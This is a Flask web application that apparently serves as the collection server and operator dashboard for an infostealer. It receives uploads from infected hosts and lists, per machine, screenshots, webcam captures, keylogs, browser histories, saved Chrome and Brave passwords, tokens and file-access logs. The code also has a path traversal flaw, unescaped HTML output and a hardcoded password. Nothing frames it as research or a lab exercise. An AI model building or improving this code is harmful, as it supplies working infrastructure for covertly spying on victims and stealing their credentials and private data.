import os
from flask import Flask, request, send_from_directory, render_template_string, abort
from werkzeug.utils import secure_filename
from datetime import datetime
import pytz

UPLOAD_ROOT = "logs"
PASSWORD = "disha456"

app = Flask(__name__)
os.makedirs(UPLOAD_ROOT, exist_ok=True)

COLUMNS = [
    "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
]

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <title>System Log Monitor</title>
  <style>
    body { background-color: black; color: lime; font-family: monospace; }
    h2 { color: cyan; }
    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
    th, td { border: 1px solid lime; padding: 8px; text-align: center; }
    th { font-size: 18px; font-weight: bold; background: #222; }
    td a { color: cyan; text-decoration: none; }
    form { margin-top: 30px; }
    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
    .logview { text-align: left; max-height: 300px; overflow-y: scroll; white-space: pre-wrap; background: #111; padding: 10px; border: 1px solid lime; }
  </style>
</head>
<body>
  {% if not authed %}
    <h2>Enter Password to Access Logs</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="Enter password"/>
      <button type="submit">Login</button>
    </form>
  {% else %}
    <h2>📂 Logs in Server</h2>
    <table>
      <tr>
        {% for col in columns %}
          <th>{{ col }}</th>
        {% endfor %}
      </tr>
      {% for folder in logs %}
        <tr>
          <td>{{ folder.hostname }}</td>
          <td>{{ folder.timestamp }}</td>
          {% for i, file in enumerate(folder.files) %}
            {% if columns[i+2] == 'Decoded Keylogs' and folder.raw_files[i] %}
              <td><a href="/view/{{ folder.foldername }}/{{ folder.raw_files[i] }}" target="_blank">👁 View</a></td>
            {% elif file %}
              <td><a href="{{ file }}" download>📥 Download</a></td>
            {% else %}
              <td>-</td>
            {% endif %}
          {% endfor %}
        </tr>
      {% endfor %}
    </table>
  {% endif %}
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    authed = False
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            authed = True
    elif request.args.get("access") == PASSWORD:
        authed = True

    log_entries = []
    if authed:
        for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
            full_path = os.path.join(UPLOAD_ROOT, folder)
            if os.path.isdir(full_path):
                row = {
                    "hostname": folder.split("_")[0],
                    "timestamp": convert_to_indian_time(folder),
                    "files": [],
                    "raw_files": [],
                    "foldername": folder
                }

                try:
                    for col in COLUMNS[2:]:
                        matched = None
                        for f in os.listdir(full_path):
                            if col.lower().replace(" ", "_") in f.lower():
                                matched = f
                                break
                        if matched:
                            row["files"].append(f"/download/{folder}/{matched}")
                            row["raw_files"].append(matched)
                        else:
                            row["files"].append(None)
                            row["raw_files"].append(None)
                except Exception as e:
                    print(f"Error in folder {folder}: {e}")
                    continue

                log_entries.append(row)

    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)

@app.route("/view/<folder>/<filename>")
def view_log(folder, filename):
    filepath = os.path.join(UPLOAD_ROOT, folder, filename)
    if not os.path.exists(filepath):
        abort(404)
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        return f"<html><body><pre class='logview'>{content}</pre></body></html>"
    except Exception as e:
        return f"<pre>Error reading file: {e}</pre>"

@app.route("/download/<folder>/<filename>")
def download(folder, filename):
    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)

@app.route("/api/receive", methods=["POST"])
def receive():
    indian_time = convert_to_indian_time(datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S"))
    folder_name = indian_time.replace(":", "-").replace("__", "_")
    save_dir = os.path.join(UPLOAD_ROOT, folder_name)
    os.makedirs(save_dir, exist_ok=True)

    for f in request.files.values():
        filename = secure_filename(f.filename)
        f.save(os.path.join(save_dir, filename))
    return "Logs received"

def convert_to_indian_time(utc_str):
    try:
        utc_time = datetime.strptime(utc_str, "%Y-%m-%d_%H-%M-%S")
        india = pytz.timezone("Asia/Kolkata")
        return utc_time.replace(tzinfo=pytz.utc).astimezone(india).strftime("%H:%M:%S__%d:%m:%Y")
    except:
        return utc_str

if __name__ == "__main__":
    app.run(debug=True)
